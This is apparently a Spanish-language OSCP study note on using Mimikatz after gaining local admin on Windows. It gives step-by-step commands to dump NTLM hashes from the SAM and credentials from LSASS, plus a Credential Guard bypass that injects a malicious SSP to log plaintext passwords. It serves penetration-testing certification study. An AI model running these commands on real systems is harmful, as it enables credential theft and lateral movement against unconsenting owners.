---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, ad, password, windows]
fecha: 2026-10-05
---

# Mimikatz

> [!abstract] Qué es y cuándo usarla
> Extrae **hashes NTLM y contraseñas en plaintext** de Windows: de la **SAM** (cuentas locales) y de la memoria de **LSASS** (incluidas credenciales de **dominio** cacheadas). Úsala tras conseguir **admin local** en un Windows para pivotar (crackear hashes o Pass-the-Hash). Requiere **admin + SeDebugPrivilege** (LSASS corre como SYSTEM).

## Requisitos previos
- Sesión **PowerShell/Terminal como Administrador** (UAC → Yes).
- `mimikatz.exe` en el disco (ej. `C:\tools\mimikatz.exe`).
- Sintaxis: `modulo::comando` (ej. `privilege::debug`).

## Pasos
```powershell
.\mimikatz.exe
privilege::debug          # habilita SeDebugPrivilege (debug de procesos de otros users)
token::elevate            # eleva a NT AUTHORITY\SYSTEM (necesario para lsadump::sam)

lsadump::sam              # NTLM de cuentas LOCALES (SAM)
sekurlsa::logonpasswords  # hashes/plaintext de TODOS los orígenes en LSASS (incl. dominio)
```

Bypass de **Credential Guard** (cuando no se pueden sacar hashes de dominio de LSASS):
```powershell
privilege::debug
misc::memssp              # inyecta un SSP malicioso en LSASS (sin DLL en disco)
# tras el PRÓXIMO login de un usuario:
type C:\Windows\System32\mimilsa.log   # credenciales en PLAINTEXT
```

| Comando | Qué hace |
|---|---|
| `privilege::debug` | Habilita SeDebugPrivilege (imprescindible) |
| `token::elevate` | Eleva a SYSTEM (requiere SeImpersonatePrivilege, lo tienen los admin locales) |
| `lsadump::sam` | Dumpea NTLM de la SAM (cuentas locales) |
| `sekurlsa::logonpasswords` | Dumpea credenciales cacheadas en LSASS |
| `misc::memssp` | Inyecta SSP → captura plaintext del próximo logon en `mimilsa.log` |

> [!warning] Detección / problemas
> - Sin **admin + SeDebugPrivilege** no funciona. Eleva con `token::elevate`, PsExec, o explotando SeImpersonatePrivilege.
> - No se puede copiar la SAM en caliente (`C:\Windows\system32\config\sam`): lock del kernel → por eso Mimikatz.
> - **Credential Guard** (LSAISO/VTL1) impide sacar hashes de **dominio** de LSASS (los **locales** sí) → usa `memssp` y espera un login.
> - AV/EDR detectan Mimikatz con facilidad (ver [[15 - Antivirus Evasion]]).

## Visto en
- Módulo: [[16 - Password Attacks]]
- Relacionado: [[Pass-the-Hash]] · [[Password Cracking (Hashcat y John)]]
- Máquinas: [[]]
